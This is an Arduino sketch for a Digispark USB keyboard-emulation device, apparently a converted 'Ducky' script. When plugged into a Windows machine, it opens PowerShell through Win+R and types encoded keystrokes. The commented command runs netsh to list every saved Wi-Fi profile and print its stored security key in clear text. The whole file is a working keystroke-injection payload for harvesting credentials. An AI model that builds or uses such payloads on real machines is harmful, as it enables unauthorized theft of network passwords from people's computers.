#include "DigiKeyboard.h"

// powershell
const uint8_t key_arr_0[] PROGMEM = {0,19, 0,18, 0,26, 0,8, 0,21, 0,22, 0,11, 0,8, 0,15, 0,15};
//  (netsh wlan show profiles) | Select-String "bslash:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)} | Select-String "Key ContentbslashW+bslash:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ SSID=$name;SECURITY_KEY=$pass }} | Format-Table -AutoSize
const uint8_t key_arr_1[] PROGMEM = {0,44, 2,38, 0,17, 0,8, 0,23, 0,22, 0,11, 0,44, 0,26, 0,15, 0,4, 0,17, 0,44, 0,22, 0,11, 0,18, 0,26, 0,44, 0,19, 0,21, 0,18, 0,9, 0,12, 0,15, 0,8, 0,22, 2,39, 0,44, 2,49, 0,44, 2,22, 0,8, 0,15, 0,8, 0,6, 0,23, 0,45, 2,22, 0,23, 0,21, 0,12, 0,17, 0,10, 0,44, 2,52, 0,49, 2,51, 2,38, 0,55, 2,46, 2,39, 2,33, 2,52, 0,44, 2,49, 0,44, 2,34, 2,47, 2,33, 0,17, 0,4, 0,16, 0,8, 0,46, 2,33, 2,45, 0,55, 2,16, 0,4, 0,23, 0,6, 0,11, 0,8, 0,22, 0,55, 2,10, 0,21, 0,18, 0,24, 0,19, 0,22, 0,47, 0,30, 0,48, 0,55, 2,25, 0,4, 0,15, 0,24, 0,8, 0,55, 2,23, 0,21, 0,12, 0,16, 2,38, 2,39, 0,51, 0,44, 2,33, 2,45, 2,48, 0,44, 2,49, 0,44, 2,34, 2,47, 2,38, 0,17, 0,8, 0,23, 0,22, 0,11, 0,44, 0,26, 0,15, 0,4, 0,17, 0,44, 0,22, 0,11, 0,18, 0,26, 0,44, 0,19, 0,21, 0,18, 0,9, 0,12, 0,15, 0,8, 0,44, 0,17, 0,4, 0,16, 0,8, 0,46, 2,52, 2,33, 0,17, 0,4, 0,16, 0,8, 2,52, 0,44, 0,14, 0,8, 0,28, 0,46, 0,6, 0,15, 0,8, 0,4, 0,21, 2,39, 2,48, 0,44, 2,49, 0,44, 2,22, 0,8, 0,15, 0,8, 0,6, 0,23, 0,45, 2,22, 0,23, 0,21, 0,12, 0,17, 0,10, 0,44, 2,52, 2,14, 0,8, 0,28, 0,44, 2,6, 0,18, 0,17, 0,23, 0,8, 0,17, 0,23, 0,49, 2,26, 2,46, 0,49, 2,51, 2,38, 0,55, 2,46, 2,39, 2,33, 2,52, 0,44, 2,49, 0,44, 2,34, 2,47, 2,33, 0,19, 0,4, 0,22, 0,22, 0,46, 2,33, 2,45, 0,55, 2,16, 0,4, 0,23, 0,6, 0,11, 0,8, 0,22, 0,55, 2,10, 0,21, 0,18, 0,24, 0,19, 0,22, 0,47, 0,30, 0,48, 0,55, 2,25, 0,4, 0,15, 0,24, 0,8, 0,55, 2,23, 0,21, 0,12, 0,16, 2,38, 2,39, 0,51, 0,44, 2,33, 2,45, 2,48, 0,44, 2,49, 0,44, 2,34, 2,47, 0,47, 2,19, 2,22, 2,6, 0,24, 0,22, 0,23, 0,18, 0,16, 2,18, 0,5, 0,13, 0,8, 0,6, 0,23, 0,48, 2,31, 2,47, 0,44, 2,22, 2,22, 2,12, 2,7, 0,46, 2,33, 0,17, 0,4, 0,16, 0,8, 0,51, 2,22, 2,8, 2,6, 2,24, 2,21, 2,12, 2,23, 2,28, 2,45, 2,14, 2,8, 2,28, 0,46, 2,33, 0,19, 0,4, 0,22, 0,22, 0,44, 2,48, 2,48, 0,44, 2,49, 0,44, 2,9, 0,18, 0,21, 0,16, 0,4, 0,23, 0,45, 2,23, 0,4, 0,5, 0,15, 0,8, 0,44, 0,45, 2,4, 0,24, 0,23, 0,18, 2,22, 0,12, 0,29, 0,8};

void duckyString(const uint8_t* keys, size_t len) {  
    for(size_t i=0; i<len; i+=2) {
        DigiKeyboard.sendKeyStroke(pgm_read_byte_near(keys + i+1), pgm_read_byte_near(keys + i));
    }
}

void setup() {
    pinMode(1, OUTPUT); // Enable LED
    digitalWrite(1, LOW); // Turn LED off
    DigiKeyboard.sendKeyStroke(0); // Tell computer no key is pressed

    DigiKeyboard.sendKeyStroke(21, 8); // WINDOWS R
    DigiKeyboard.delay(2000); // DELAY 2000
    duckyString(key_arr_0, sizeof(key_arr_0)); // STRING powershell
    DigiKeyboard.sendKeyStroke(40, 0); // ENTER
    DigiKeyboard.delay(2500); // DELAY 2500
    duckyString(key_arr_1, sizeof(key_arr_1)); // STRING  (netsh wlan show profiles) | Select-St...
    DigiKeyboard.sendKeyStroke(40, 0); // ENTER
}

void loop() {}
